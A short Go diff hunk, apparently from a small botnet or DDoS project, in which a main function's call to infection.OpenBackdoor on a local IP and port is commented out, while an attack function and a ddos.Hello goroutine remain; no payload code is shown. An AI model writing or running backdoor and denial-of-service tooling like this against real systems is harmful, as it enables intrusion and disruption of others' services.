@@ -57,7 +57,7 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 }
 
 func main() {
-	go infection.OpenBackdoor("10.0.2.15:8000")
+	//go infection.OpenBackdoor("10.0.2.15:8000")
 	var wg sync.WaitGroup
 	wg.Add(1)
 	go ddos.Hello(&wg,"test")
